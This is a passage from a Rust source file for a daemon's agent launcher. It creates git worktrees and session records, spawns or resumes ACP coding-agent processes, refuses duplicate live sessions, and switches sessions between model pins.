//! Launcher: turns "spawn an agent for X" into a worktree, a session row and
//! an ACP agent process.
//!
//! A launch is refused rather than duplicated. Every spawn asks first whether
//! the seat already has a live session: a wrong no puts two agents on one
//! piece of work, where a wrong yes costs a scheduler tick that asks again.

use std::path::{Path, PathBuf};
use std::sync::Arc;

use anyhow::{Context, Result, anyhow};

use ariadne_core::models::agent_of;
use ariadne_core::{GoalStatus, PermissionMode, PromptKind, Seat, SessionStatus, TaskStatus};
use ariadne_store::{
    AgentPin, AgentSession, NewAgentEvent, NewSession, PullRequest, Repository, SessionFilter,
    Store, Task, TaskAgent, TaskFilter,
};

use crate::acp::{AcpLaunch, AcpRuntime};
use crate::acp_discovery::AgentRegistry;
use crate::agents::{
    SpawnCtx, SpawnPlan, handoff_text, link_skills, plan_resume, plan_spawn, prompts,
};
use crate::branch::BranchWatchers;
use crate::config::Config;
use crate::gitwt::GitManager;

pub struct Launcher {
    pub cfg: Arc<Config>,
    pub store: Store,
    pub git: GitManager,
    /// The daemon-owned ACP agents: every session runs as a child process
    /// driven here.
    pub acp: AcpRuntime,
    /// The ACP agent registry: which executable a session's pin names, and
    /// what discovery measured about it.
    pub registry: AgentRegistry,
    /// The task branches whose head the daemon is following, so that a commit
    /// a column's agent makes reaches the clients watching its diff.
    pub branches: BranchWatchers,
    /// What the forge said of each request Ariadne works on, on its last
    /// read (026): held here, never stored.
    pub live: crate::forge::live::LivePulls,
}

impl Launcher {
    /// The request row `id` keeps, as the forge read it last (026): an
    /// error until a fetch has read it, which the next fetch does.
    pub(crate) async fn pull_view(&self, id: &str) -> Result<PullRequest> {
        let row = self.store.get_pull_request(id).await?;
        crate::forge::live::of_row(&self.store, &self.live, row)
            .await?
            .with_context(|| format!("pull request {id} has not been read off the forge yet"))
    }

    fn run_dir(&self, session_id: &str) -> PathBuf {
        self.cfg.run_dir.join(session_id)
    }

    /// Refuse to double-spawn: one live session per (goal, task, seat), and
    /// per staffed agent where `agent_id` names one.
    ///
    /// This is the last guard before a second agent starts working on
    /// somebody else's task.
    async fn assert_no_live_session(
        &self,
        goal_id: &str,
        task_id: Option<&str>,
        seat: Seat,
        agent_id: Option<&str>,
    ) -> Result<()> {
        let live = self
            .store
            .list_sessions(SessionFilter {
                goal_id: Some(goal_id.to_string()),
                task_id: task_id.map(str::to_string),
                live_only: true,
                ..Default::default()
            })
            .await?;
        for s in live {
            if s.seat() == Some(seat)
                && agent_id.is_none_or(|a| Some(a) == s.task_agent_id.as_deref())
                && self.session_process_alive(&s).await
            {
                return Err(anyhow!(
                    "a live {} session already exists: {}",
                    seat.as_str(),
                    s.id
                ));
            }
        }
        Ok(())
    }

    /// Whether the agent process behind a session is alive: the runtime that
    /// owns the child answers ([`AcpRuntime::is_running`]), and it always
    /// answers.
    pub(crate) async fn session_process_alive(&self, session: &AgentSession) -> bool {
        self.acp.is_running(&session.id)
    }

    /// Assemble the adapter context for launching `session` in `cwd`.
    ///
    /// The agent's flags are read here rather than baked into the adapters, on
    /// every spawn and every resume alike: an edit to the agent config is meant
    /// to reach the next launch, whichever path that launch comes down.
    ///
    /// The model and the effort it runs at are the opposite: they are the ones
    /// the session was created with, off the pin its seat carries, and no
    /// launch of that session ever moves either. Editing a staffing is meant
    /// to steer the work defined after it, not to switch the model out from
    /// under a conversation already running.
    async fn spawn_ctx(
        &self,
        session: &AgentSession,
        cwd: PathBuf,
        initial_prompt: String,
    ) -> Result<SpawnCtx> {
        let skills = self.skills_of(session).await?;
        self.spawn_ctx_with(session, cwd, initial_prompt, skills)
            .await
    }

    /// What this agent knows, read here rather than passed in: one place
    /// decides what a session is briefed with, and the index in the prompt
    /// and the documents on disk are then the same list by construction.
    /// The orchestrator is staffed by nobody, so its one skill — the
    /// playbook — is named in code, and an edit to it reaches the next
    /// launch the way any task agent's skill does. A review session is
    /// staffed by the daemon, so its skill is named in code too (029). A
    /// column's agent loads what it was staffed with, its column's skills
    /// where it was staffed with none.
    async fn skills_of(&self, session: &AgentSession) -> Result<Vec<ariadne_store::Skill>> {
        let seat = session.seat().context("a staffed session needs a seat")?;
        if let Some(pull_request_id) = &session.pull_request_id {
            let pull = self.pull_view(pull_request_id).await?;
            return match seat {
                Seat::Keeper => self.keeper_skills(&pull).await,
                _ => self.review_skills(&pull).await,
            };
        }
        Ok(match seat {
            Seat::Orchestrator => vec![
                self.store
                    .get_skill(ariadne_store::defaults::ORCHESTRATION_SKILL)
                    .await?,
            ],
            Seat::Agent | Seat::Reviewer | Seat::Keeper => match &session.task_agent_id {
                Some(id) => self.store.agent_skills(id).await?,
                None => Vec::new(),
            },
        })
    }

    /// What a review session loads (029): `pr-reviewer`, its playbook, and
    /// the skills the user picked when asking, regardless of authorship. A
    /// skill deleted since is passed over rather than failing the launch.
    async fn review_skills(&self, pull: &PullRequest) -> Result<Vec<ariadne_store::Skill>> {
        let mut skills = vec![
            self.store
                .get_skill(ariadne_store::defaults::PR_REVIEWER_SKILL)
                .await?,
        ];
        for name in pull.review_skills() {
            if let Ok(skill) = self.store.get_skill(&name).await {
                skills.push(skill);
            }
        }
        Ok(skills)
    }

    /// What a keeper session loads (032): `pr-babysit`, the same playbook
    /// the `pr` column of a task stages (030), and the skills the user
    /// picked when asking. A skill deleted since is passed over rather
    /// than failing the launch.
    async fn keeper_skills(&self, pull: &PullRequest) -> Result<Vec<ariadne_store::Skill>> {
        let mut skills = vec![
            self.store
                .get_skill(ariadne_store::defaults::PR_BABYSIT_SKILL)
                .await?,
        ];
        for name in pull.babysit_skills() {
            if let Ok(skill) = self.store.get_skill(&name).await {
                skills.push(skill);
            }
        }
        Ok(skills)
    }

    /// [`Self::spawn_ctx`] with the skills already decided.
    async fn spawn_ctx_with(
        &self,
        session: &AgentSession,
        cwd: PathBuf,
        initial_prompt: String,
        skills: Vec<ariadne_store::Skill>,
    ) -> Result<SpawnCtx> {
        let extra_flags = self.store.agent_flags(agent_of(&session.model)).await?;
        let seat = session.seat().context("a staffed session needs a seat")?;
        let run_dir = self.run_dir(&session.id);
        // Linked before the adapter plans anything, and by the same call that
        // renders the index, so what the prompt names resolves through it.
        // Linked on every launch, staffed with a skill or not: the agent can
        // still open any skill the link carries, and a resume never keeps a
        // stale link behind an empty staffing.
        let skills_dir = link_skills(&run_dir, &self.cfg.skills_dir)?;
        let system_prompt = match session.pull_request_id {
            Some(_) => prompts::pull_request_system_prompt(seat, &skills, Some(&skills_dir)),
            None => prompts::system_prompt(seat, &skills, Some(&skills_dir)),
        };
        let skill_index = prompts::skill_index(&skills, Some(&skills_dir));
        if session.goal_id.is_none() && session.pull_request_id.is_none() {
            anyhow::bail!("a staffed session needs a goal");
        }
        // The pin is `<agent>:<model>`; the agent is told only its own half.
        let model = session
            .model
            .split_once(':')
            .map_or(session.model.as_str(), |(_, model)| model)
            .to_string();
        Ok(SpawnCtx {
            session_id: session.id.clone(),
            // Minted here, once per launch: the row is told it in
            // [`Self::launch`], before the agent it belongs to exists.
            launch_id: ariadne_core::id::new_id(),
            goal_id: session.goal_id.clone(),
            task_id: session.task_id.clone(),
            pull_request_id: session.pull_request_id.clone(),
            seat,
            run_dir,
            cwd,
            socket_path: self.cfg.socket_path.clone(),
            cli_bin: self.cfg.cli_bin.clone(),
            system_prompt,
            skill_index,
            skills_dir: Some(skills_dir),
            initial_prompt,
            model,
            effort: session.effort.clone(),
            extra_flags,
        })
    }

    /// Shared launch tail for fresh spawns and resumes: persist the internal
    /// session id, and start the agent the session's pin names as the
    /// daemon's own child, driven over the protocol (`crate::acp`).
    ///
    /// What runs is the registry command of the agent the pin's first
    /// segment names, with the agent's configured flags behind it; a pin
    /// naming no registry agent fails the launch. A resume is gated on what
    /// discovery measured about that agent first.
    ///
    /// `launch_id` is what this run of the agent will report under, and the
    /// row is given it before the process starts. Both halves of that order
    /// matter on a relaunch, where one process is being torn down as another
    /// starts under the same session id: written any later, the new agent's
    /// first events would name a launch the row had not heard of; written any
    /// earlier, the old agent's last ones would still count.
    async fn launch(&self, session: &AgentSession, plan: SpawnPlan, launch_id: &str) -> Result<()> {
        if let Some(internal) = &plan.internal_session_id {
            self.store
                .set_session_internal_id(&session.id, internal)
                .await?;
        }
        // The repository the session works in answers its permission
        // requests, and holds what `learn` remembers. A learned key names its
        // checkout and the session's branch by placeholders: the task's
        // branch for a column's agent, the request's head for a review
        // session.
        let mut task_branch = None;
        let repository = match &session.task_id {
            Some(task_id) => {
                let task = self.store.get_task(task_id).await?;
                task_branch = Some(task.branch.clone());
                Some(self.store.get_repository(&task.repo_id).await?)
            }
            // A pull request session works in its request's repository, on
            // the request's head branch (026).
            None if session.pull_request_id.is_some() => {
                let pull = self
                    .pull_view(session.pull_request_id.as_deref().unwrap_or_default())
                    .await?;
                task_branch = Some(pull.head_branch.clone());
                Some(self.store.get_repository(&pull.repository_id).await?)
            }
            None if session.goal_id.is_some() => Some(
                self.store
                    .list_goal_repositories(
                        session.goal_id.as_deref().context("session has no goal")?,
                    )
                    .await?
                    .into_iter()
                    .next()
                    .context("the session's goal has no repository")?,
            ),
            None => self
                .store
                .list_repositories()
                .await?
                .into_iter()
                .filter(|repo| plan.cwd.starts_with(&repo.path))
                .max_by_key(|repo| repo.path.len()),
        };
        // A loose session outside every registered checkout has no
        // repository to ask, and nowhere to remember an approval.
        let (repository_id, repository_path, permission_mode) = repository.map_or_else(
            || (String::new(), String::new(), PermissionMode::Auto),
            |repo| {
                let mode = repo.permission_mode();
                (repo.id, repo.path, mode)
            },
        );
        self.acp.set_task_branch(&session.id, task_branch);
        let agent_id = agent_of(&session.model);
        let command = self.registry.command_of(agent_id).with_context(|| {
            format!(
                "session {} is pinned to `{}`, and the ACP registry holds no agent `{agent_id}`",
                session.id, session.model
            )
        })?;
        if plan.config.resume_session_id.is_some() {
            self.assert_acp_session_resumable(session, agent_id).await?;
        }
        let mut command = command.into_iter();
        let program = command.next().context("the registry command is empty")?;
        let args = command.chain(plan.args).collect();
        self.store
            .set_session_launch(&session.id, launch_id)
            .await?;
        self.acp
            .launch(AcpLaunch {
                session_id: session.id.clone(),
                launch_id: launch_id.to_string(),
                program,
                agent_id: agent_id.to_string(),
                args,
                env: plan.env,
                cwd: plan.cwd,
                config: plan.config,
                repository_id,
                repository_path,
                permission_mode,
            })
            .await
            .context("spawning the ACP agent")?;
        // Stamped before the status, so that a session seen `running` is
        // always a session whose launch is dated: the scheduler measures a
        // resumed agent's silence from here, and a launch it cannot date is a
        // launch it cannot watch.
        self.store.mark_session_launched(&session.id).await?;
        // Running, but only over a row still starting: the driver reports
        // from the moment it spawns, and an agent that failed fast has ended
        // the row by now — Running written over that would resurrect it until
        // the sweep retires it again.
        if self.store.get_session(&session.id).await?.status() == SessionStatus::Starting {
            self.store
                .set_session_status(&session.id, SessionStatus::Running)
                .await?;
        }
        Ok(())
    }

    /// Refuse to resume a session of an agent that cannot load one.
    ///
    /// Discovery measures whether an agent supports `session/load`
    /// (`session_load`), and an agent without it has no way back into a
    /// stored conversation: a launch that went ahead would open a fresh
    /// session and call it the old one. The refusal names the session and
    /// the agent, which is what the caller reports.
    async fn assert_acp_session_resumable(
        &self,
        session: &AgentSession,
        agent_id: &str,
    ) -> Result<()> {
        let resumable = self
            .registry
            .capabilities_of(agent_id)
            .await
            .is_some_and(|capabilities| capabilities.session_load);
        if !resumable {
            anyhow::bail!(
                "session {} is not resumable: ACP agent {agent_id} does not support session/load",
                session.id
            );
        }
        Ok(())
    }

    async fn spawn(
        &self,
        session: &AgentSession,
        cwd: PathBuf,
        initial_prompt: String,
    ) -> Result<()> {
        let ctx = self.spawn_ctx(session, cwd, initial_prompt).await?;
        let plan = plan_spawn(&ctx)?;
        self.launch(session, plan, &ctx.launch_id).await?;
        self.clear_superseded_attention(session).await;
        Ok(())
    }

    /// The session of one staffed agent on this task there is something to
    /// resume, and the agent conversation it left behind: the most recent one
    /// with a conversation in it ([`Self::has_conversation`]).
    ///
    /// A session that never got going has none, and that is nothing to resume
    /// — the caller spawns afresh instead.
    async fn resumable_session(
        &self,
        task_id: &str,
        agent_id: &str,
    ) -> Result<Option<(AgentSession, String)>> {
        let sessions = self
            .store
            .list_sessions(SessionFilter {
                task_id: Some(task_id.to_string()),
                ..Default::default()
            })
            .await?;
        for s in sessions.into_iter().rev() {
            if s.seat() == Some(Seat::Agent)
                && s.task_agent_id.as_deref() == Some(agent_id)
                && let Some(internal) = self.has_conversation(&s).await?
            {
                return Ok(Some((s, internal)));
            }
        }
        Ok(None)
    }

    /// The agent conversation a resume of `session` reopens: its captured
    /// internal id, where its agent is still up or a prompt ever went out on
    /// it.
    ///
    /// An agent names its conversation at `session/new`, but one that dies
    /// before its first turn — a model pin refused while it is rate limited —
    /// may have saved nothing under that name, and claude-acp does not. A
    /// resume of it fails on "Resource not found", and the briefing it
    /// carried is lost, while the conversation that holds the work is an
    /// older session of the same seat.
    async fn has_conversation(&self, session: &AgentSession) -> Result<Option<String>> {
        let Some(internal) = session.internal_session_id.clone() else {
            return Ok(None);
        };
        if session.status().is_live() {
            return Ok(Some(internal));
        }
        let prompted = self
            .store
            .count_session_events(&session.id, "user_prompt_submit")
            .await?
            > 0;
        Ok(prompted.then_some(internal))
    }

    /// The tail every resume shares, once the row has been put back on its
    /// feet: the agent launched again in `cwd`, on the conversation `internal`
    /// names, with `instruction` to come back to.
    async fn launch_resumed(
        &self,
        session: &AgentSession,
        cwd: PathBuf,
        internal: &str,
        instruction: &str,
    ) -> Result<AgentSession> {
        let ctx = self.spawn_ctx(session, cwd, String::new()).await?;
        let plan = plan_resume(&ctx, internal, instruction)?;
        self.launch(session, plan, &ctx.launch_id).await?;
        self.store
            .get_session(&session.id)
            .await
            .map_err(Into::into)
    }

    /// Drop the attention carried by the sessions this fresh one replaces.
    ///
    /// A session that ended needing the user keeps saying so until something
    /// is done about it, and starting its replacement is that something — but
    /// only once the replacement is actually up: a spawn that dies on the way
    /// leaves the old row flagged, which is what the flag is for. Resumes take
    /// the other road (`restart_session` clears the row it relaunches); this
    /// is for the fresh spawn that supersedes a row instead of reviving it.
    ///
    /// "Replaces" is the identity a spawn is refused for: the seat on this
    /// goal and task, and for a column's agent the staffed agent too, since
    /// the agents of a task's columns are siblings that only their agent row
    /// tells apart.
    async fn clear_superseded_attention(&self, session: &AgentSession) {
        let Ok(siblings) = self
            .store
            .list_sessions(SessionFilter {
                goal_id: session.goal_id.clone(),
                task_id: session.task_id.clone(),
                ..Default::default()
            })
            .await
        else {
            return;
        };
        for previous in siblings {
            if previous.id != session.id
                && previous.task_id == session.task_id
                && previous.pull_request_id == session.pull_request_id
                && previous.seat() == session.seat()
                && (previous.seat() != Some(Seat::Agent)
                    || previous.task_agent_id == session.task_agent_id)
                && previous.attention_reason().is_some()
            {
                tracing::info!(
                    session = %previous.id,
                    replacement = %session.id,
                    "superseded by a fresh session, clearing its attention"
                );
                let _ = self.store.clear_session_attention(&previous.id).await;
            }
        }
    }

    /// The briefing an orchestrator starts on, for a spawn and a switch
    /// alike: the goal, its workflow with every column, and its repositories.
    async fn orchestrator_briefing(
        &self,
        goal: &ariadne_store::Goal,
        repos: &[Repository],
    ) -> Result<String> {
        let template = prompts::template_for(PromptKind::OrchestratorBriefing);
        let steps = self.store.goal_steps(&goal.id).await?;
        Ok(prompts::orchestrator_briefing(
            template, goal, repos, &steps,
        ))
    }

    /// Spawn the orchestrator for a goal (cwd = first repo).
    pub async fn spawn_orchestrator(&self, goal_id: &str) -> Result<AgentSession> {
        let goal = self.store.get_goal(goal_id).await?;
        let repos = self.store.list_goal_repositories(goal_id).await?;
        let repo = repos.first().context("goal has no repos")?;
        self.assert_no_live_session(goal_id, None, Seat::Orchestrator, None)
            .await?;

        let session = self
            .store
            .create_session(NewSession {
                goal_id: Some(goal.id.clone()),
                task_id: None,
                seat: Some(Seat::Orchestrator),
                task_agent_id: None,
                model: goal.model.clone(),
                effort: goal.effort.clone(),
                worktree_path: None,
                pull_request_id: None,
            })
            .await?;

        let briefing = self.orchestrator_briefing(&goal, &repos).await?;
        self.spawn(&session, PathBuf::from(&repo.path), briefing)
            .await?;
        self.store
            .get_session(&session.id)
            .await
            .map_err(Into::into)
    }

    /// Resume the goal's orchestrator in place — the same row, on the
    /// conversation it left behind — or spawn a first one where there is
    /// nothing to resume.
    ///
    /// One orchestrator per goal, for the whole goal: it holds the plan and
    /// what the user agreed with it. An agent process that went away — a
    /// daemon restart takes every one down — is that same orchestrator put
    /// back on its feet, not a stranger starting from the briefing.
    pub(crate) async fn resume_orchestrator(
        &self,
        goal_id: &str,
        instruction: &str,
    ) -> Result<AgentSession> {
        let repos = self.store.list_goal_repositories(goal_id).await?;
        let repo = repos.first().context("goal has no repos")?;
        let sessions = self
            .store
            .list_sessions(SessionFilter {
                goal_id: Some(goal_id.to_string()),
                ..Default::default()
            })
            .await?;
        let mut found = None;
        for s in sessions.into_iter().rev() {
            if s.seat() == Some(Seat::Orchestrator)
                && let Some(internal) = self.has_conversation(&s).await?
            {
                found = Some((s, internal));
                break;
            }
        }
        let Some((previous, internal)) = found else {
            return self.spawn_orchestrator(goal_id).await;
        };
        self.assert_no_live_session(goal_id, None, Seat::Orchestrator, None)
            .await?;
        let session = self.store.restart_session(&previous.id, None).await?;
        self.launch_resumed(&session, PathBuf::from(&repo.path), &internal, instruction)
            .await
    }

    /// Launch one workflow agent on the task's shared branch and worktree:
    /// its earlier conversation resumed where it left one on the pin the
    /// agent still has, a fresh one where it did not, where the last launch
    /// died on arrival, or where a staffing edit moved the agent's model or
    /// effort since — a session freezes its pin at its first launch (011), so
    /// the new pin gets a session of its own and the old one stays as
    /// history. The scheduler supplies the durable column prompt after this
    /// launch.
    pub async fn start_step_agent(&self, task: &Task, agent: &TaskAgent) -> Result<AgentSession> {
        self.assert_no_live_session(&task.goal_id, Some(&task.id), Seat::Agent, Some(&agent.id))
            .await?;
        let repo = self.store.get_repository(&task.repo_id).await?;
        let worktree = self
            .task_worktree(
                task,
                &repo,
                task.worktree_path.as_deref().map(PathBuf::from),
            )
            .await?;
        let previous = self.resumable_session(&task.id, &agent.id).await?;
        let (session, internal) = match previous {
            Some((previous, internal))
                if !previous.died_on_arrival()
                    && previous.model == agent.model
                    && previous.effort == agent.effort =>
            {
                (
                    self.store
                        .restart_session(&previous.id, Some(&worktree.display().to_string()))
                        .await?,
                    Some(internal),
                )
            }
            _ => (
                self.store
                    .create_session(NewSession {
                        goal_id: Some(task.goal_id.clone()),
                        task_id: Some(task.id.clone()),
                        seat: Some(Seat::Agent),
                        task_agent_id: Some(agent.id.clone()),
                        model: agent.model.clone(),
                        effort: agent.effort.clone(),
                        worktree_path: Some(worktree.display().to_string()),
                        pull_request_id: None,
                    })
                    .await?,
                None,
            ),
        };
        let ctx = self.spawn_ctx(&session, worktree, String::new()).await?;
        let mut plan = match internal {
            Some(internal) => plan_resume(&ctx, &internal, "")?,
            None => plan_spawn(&ctx)?,
        };
        plan.config.initial_prompt = None;
        self.launch(&session, plan, &ctx.launch_id).await?;
        self.clear_superseded_attention(&session).await;
        Ok(self.store.get_session(&session.id).await?)
    }

    /// The first briefing of a column: the task, the column, the values its
    /// commands act on, and what the column before it said.
    pub async fn step_first_briefing(
        &self,
        task: &Task,
        step: &ariadne_store::GoalStep,
        reason: &str,
    ) -> Result<String> {
        let task = self.store.get_task(&task.id).await?;
        let goal = self.store.get_goal(&task.goal_id).await?;
        let repo = self.store.get_repository(&task.repo_id).await?;
        let mut deps = Vec::new();
        for id in self.store.list_task_dependencies(&task.id).await? {
            let dep = self.store.get_task(&id).await?;
            deps.push(dependency_line(&dep.title, &dep.status, &dep.branch));
        }
        Ok(prompts::step_briefing(
            prompts::template_for(PromptKind::StepBriefing),
            &task,
            &goal,
            &repo,
            step,
            reason,
            &deps.join("\n"),
        ))
    }

    /// Resume an outside conversation in its recorded directory.
    pub(crate) async fn resume_outside(
        &self,
        outside: &ariadne_api::sessions::OutsideSessionDto,
    ) -> Result<AgentSession> {
        // Checked before a row is made: an agent cannot start in a directory
        // that is gone, and a failed row would hold the conversation from
        // then on, in the listing's outside half's place.
        let cwd = PathBuf::from(&outside.working_directory);
        if !cwd.is_dir() {
            anyhow::bail!(
                "the directory this conversation ran in is gone: {}",
                cwd.display()
            );
        }
        let model = self
            .registry
            .default_model(&outside.agent_id)
            .await
            .context("the agent has no discovered default model")?;
        let session = self
            .store
            .create_session(NewSession {
                goal_id: None,
                task_id: None,
                seat: None,
                task_agent_id: None,
                model: format!("{}:{model}", outside.agent_id),
                effort: None,
                worktree_path: Some(outside.working_directory.clone()),
                pull_request_id: None,
            })
            .await?;
        self.store
            .set_session_internal_id(&session.id, &outside.internal_session_id)
            .await?;
        if let Some(title) = loose_title(&outside.first_prompt) {
            self.store
                .set_session_title_if_unset(&session.id, &title)
                .await?;
        }
        let result = self
            .launch_loose(&session, cwd, Some(&outside.internal_session_id), "")
            .await;
        if result.is_err() {
            self.store
                .set_session_status(&session.id, SessionStatus::Failed)
                .await?;
            crate::stats::record_session_end(&self.store, &session.id).await;
        }
        result
    }

    /// Start a loose session: a new conversation with the agent the pin
    /// names, in `cwd`, with no goal, task or seat. The agent answers
    /// `session/new`, and waits for the first prompt typed into its console.
    pub(crate) async fn start_loose(
        &self,
        pin: ariadne_store::AgentPin,
        cwd: PathBuf,
    ) -> Result<AgentSession> {
        let session = self
            .store
            .create_session(NewSession {
                goal_id: None,
                task_id: None,
                seat: None,
                task_agent_id: None,
                model: pin.model,
                effort: pin.effort,
                worktree_path: Some(cwd.display().to_string()),
                pull_request_id: None,
            })
            .await?;
        let result = self.launch_loose(&session, cwd, None, "").await;
        if result.is_err() {
            self.store
                .set_session_status(&session.id, SessionStatus::Failed)
                .await?;
            crate::stats::record_session_end(&self.store, &session.id).await;
        }
        result
    }

    /// Launch a loose session's agent: loading the conversation `internal`
    /// names, or opening a new one where there is none.
    async fn launch_loose(
        &self,
        session: &AgentSession,
        cwd: PathBuf,
        internal: Option<&str>,
        instruction: &str,
    ) -> Result<AgentSession> {
        let launch_id = ariadne_core::id::new_id();
        let plan = SpawnPlan {
            args: self.store.agent_flags(agent_of(&session.model)).await?,
            env: vec![
                ("ARIADNE_SESSION_ID".into(), session.id.clone()),
                ("ARIADNE_LAUNCH_ID".into(), launch_id.clone()),
            ],
            cwd,
            internal_session_id: internal.map(str::to_string),
            config: ariadne_core::acp::LaunchConfig {
                version: ariadne_core::acp::VERSION,
                system_prompt: String::new(),
                initial_prompt: (!instruction.is_empty()).then(|| instruction.to_string()),
                model: session
                    .model
                    .split_once(':')
                    .context("session has no agent pin")?
                    .1
                    .to_string(),
                effort: session.effort.clone(),
                resume_session_id: internal.map(str::to_string),
                mcp_servers: Vec::new(),
            },
        };
        self.launch(session, plan, &launch_id).await?;
        Ok(self.store.get_session(&session.id).await?)
    }

    /// The task's one worktree, checked out on its branch: created on the
    /// first column's first launch, and created again whenever it has been
    /// cleaned up under a task that is still going. Every column works in it
    /// in turn — the branch is the task's from the first commit to the last
    /// column.
    ///
    /// `keep` is the tree the task was working in — kept while it is still on
    /// disk, since an agent is put back where the task left off rather than
    /// beside it. A first spawn passes `None` and gets the canonical path.
    async fn task_worktree(
        &self,
        task: &Task,
        repo: &Repository,
        keep: Option<PathBuf>,
    ) -> Result<PathBuf> {
        let worktree = match keep {
            Some(existing) if existing.is_dir() => existing,
            _ => self
                .cfg
                .worktree_root
                .join(tail(&task.goal_id))
                .join(format!("{}-eng", tail(&task.id))),
        };
        if !worktree.exists() {
            std::fs::create_dir_all(worktree.parent().unwrap())?;
            self.git
                .add_worktree(
                    &PathBuf::from(&repo.path),
                    &worktree,
                    &task.branch,
                    &repo.base_branch,
                )
                .await?;
        }
        self.store
            .set_task_worktree(&task.id, Some(&worktree.display().to_string()))
            .await?;
        // There is a tree to commit in now: follow what the branch does.
        self.branches.watch(task, Path::new(&repo.path));
        Ok(worktree)
    }

    /// Revive an ended session in a fresh agent process, continuing the same
    /// agent conversation via its stored internal id. The session itself is
    /// revived — same row, same id — so the caller gets back what it asked
    /// for. Used by `ariadne attach` when no agent is alive.
    /// `instruction: None` resumes into an idle agent so the user can type
    /// themselves.
    pub async fn revive_session(
        &self,
        session_id: &str,
        instruction: Option<&str>,
    ) -> Result<AgentSession> {
        let previous = self.store.get_session(session_id).await?;
        if self.session_process_alive(&previous).await {
            // Already alive — attaching needs nothing from us.
            return Ok(previous);
        }
        self.resume_in_place(previous, instruction).await
    }

    /// Relaunch a session's agent in place, alive or not: a fresh agent
    /// process on the same row and the same conversation, told
    /// `instruction` as its first turn. The process it replaces goes with
    /// the launch, and the session itself does not end — a relaunch is not
    /// an end (008), so a console open over it stays open.
    pub async fn relaunch_session(
        &self,
        session_id: &str,
        instruction: &str,
    ) -> Result<AgentSession> {
        let previous = self.store.get_session(session_id).await?;
        self.resume_in_place(previous, Some(instruction)).await
    }

    /// The tail [`Self::revive_session`] and [`Self::relaunch_session`]
    /// share: the conversation to go back to, the directory to go back to it
    /// in, and the launch on the same row.
    async fn resume_in_place(
        &self,
        previous: AgentSession,
        instruction: Option<&str>,
    ) -> Result<AgentSession> {
        let internal = previous
            .internal_session_id
            .as_deref()
            .context("session has no internal agent id to resume from")?;
        let goal = match previous.goal_id.as_deref() {
            Some(id) => Some(self.store.get_goal(id).await?),
            None => None,
        };
        if goal
            .as_ref()
            .is_some_and(|goal| goal.status() == ariadne_core::GoalStatus::Cancelled)
        {
            anyhow::bail!("cannot revive a session of a cancelled goal");
        }
        let task = match previous.task_id.as_deref() {
            Some(id) => Some(self.store.get_task(id).await?),
            None => None,
        };
        let cwd = match previous.worktree_path.as_deref().map(PathBuf::from) {
            Some(path) if path.is_dir() => path,
            _ => match &task {
                Some(task) => PathBuf::from(self.store.get_repository(&task.repo_id).await?.path),
                None if previous.pull_request_id.is_some() => {
                    let pull = self
                        .store
                        .get_pull_request(previous.pull_request_id.as_deref().unwrap_or_default())
                        .await?;
                    PathBuf::from(self.store.get_repository(&pull.repository_id).await?.path)
                }
                None => match &goal {
                    Some(goal) => PathBuf::from(
                        &self
                            .store
                            .list_goal_repositories(&goal.id)
                            .await?
                            .first()
                            .context("goal has no repositories")?
                            .path,
                    ),
                    None => anyhow::bail!("the loose session's working directory is gone"),
                },
            },
        };
        if !cwd.is_dir() {
            anyhow::bail!(
                "session working directory does not exist: {}",
                cwd.display()
            );
        }
        // A user can continue the conversation after its scheduled work ended.
        if goal
            .as_ref()
            .is_some_and(|goal| goal.status().is_terminal())
            || task
                .as_ref()
                .is_some_and(|task| task.status().is_terminal())
        {
            self.acp.preserve_user_resume(&previous.id);
        }
        let session = self.store.restart_session(&previous.id, None).await?;
        if session.seat.is_none() {
            self.launch_loose(&session, cwd, Some(internal), instruction.unwrap_or(""))
                .await
        } else {
            self.launch_resumed(&session, cwd, internal, instruction.unwrap_or(""))
                .await
        }
    }

    /// Switch a session onto another pin. Keep its conversation when the
    /// registry agent stays the same.
    ///
    /// The old agent is cancelled, killed and reaped before anything new
    /// starts, so two agents never work on one seat. The old row is marked
    /// `exited` and keeps a `session.switched` event naming its successor
    /// and `reason`. The seat's pin moves with the switch, so a later spawn
    /// or resume of the seat runs on the new one; a loose session has no
    /// seat pin to move.
    ///
    /// The new agent has no conversation to resume. It is briefed as a fresh
    /// spawn of its seat is, then handed the old session's history
    /// ([`handoff_text`]), then told what a resume would have told it. A
    /// loose session has no briefing and no resume text: it gets the history
    /// alone.
    pub(crate) async fn switch_session(
        &self,
        session_id: &str,
        model: &str,
        effort: Option<&str>,
        reason: &str,
    ) -> Result<AgentSession> {
        let old = self.store.get_session(session_id).await?;
        if let Some(goal_id) = old.goal_id.as_deref()
            && self.store.get_goal(goal_id).await?.status() == GoalStatus::Cancelled
        {
            anyhow::bail!("cannot switch a session of a cancelled goal");
        }
        // One successor per session: a switch repeated against the old id
        // would start a second agent on the seat. Two switches that race past
        // this check meet the unique index on `switched_from` instead.
        if let Some(successor) = self.store.switched_successor(&old.id).await? {
            anyhow::bail!(
                "session {} is already switched, to session {}",
                old.id,
                successor.id
            );
        }
        if ariadne_core::models::agent_of(&old.model) == ariadne_core::models::agent_of(model) {
            let pin = AgentPin {
                model: model.to_string(),
                effort: effort.map(str::to_string),
            };
            if self.acp.is_running(&old.id) {
                self.acp
                    .switch_pin(
                        &old.id,
                        model.split_once(':').map_or(model, |(_, value)| value),
                        effort,
                    )
                    .await?;
            }
            // Off the row before the pin moves: the fact is of the session
            // that leaves, so its `model` is the model left.
            crate::stats::record_switch(
                &self.store,
                &old,
                serde_json::json!({
                    "to_model": pin.model,
                    "to_effort": pin.effort,
                    "reason": reason,
                    "automatic": reason == "exhausted",
                    "same_agent": true,
                }),
            )
            .await;
            let session = self.store.set_session_pin(&old.id, &pin).await?;
            self.move_seat_pin(&old, &pin).await?;
            self.store
                .create_event(NewAgentEvent {
                    session_id: Some(old.id.clone()),
                    task_id: old.task_id.clone(),
                    kind: "session.switched".into(),
                    payload: serde_json::json!({
                        "session_id": old.id,
                        "to": old.id,
                        "model": pin.model,
                        "effort": pin.effort,
                        "reason": reason,
                    }),
                })
                .await?;
            return Ok(session);
        }
        self.acp.kill_and_wait(&old.id).await;
        // The old agent is gone, so a live agent on the seat now is another
        // session's: the seat is taken, and this switch starts nothing.
        if let (Some(goal_id), Some(seat)) = (old.goal_id.as_deref(), old.seat()) {
            self.assert_no_live_session(
                goal_id,
                old.task_id.as_deref(),
                seat,
                old.task_agent_id.as_deref(),
            )
            .await?;
        }

        let plan = match old.seat() {
            None => self.loose_switch(&old)?,
            Some(Seat::Orchestrator) => self.orchestrator_switch(&old).await?,
            Some(_) if old.pull_request_id.is_some() => self.pull_request_switch(&old).await?,
            Some(Seat::Agent) => self.agent_switch(&old).await?,
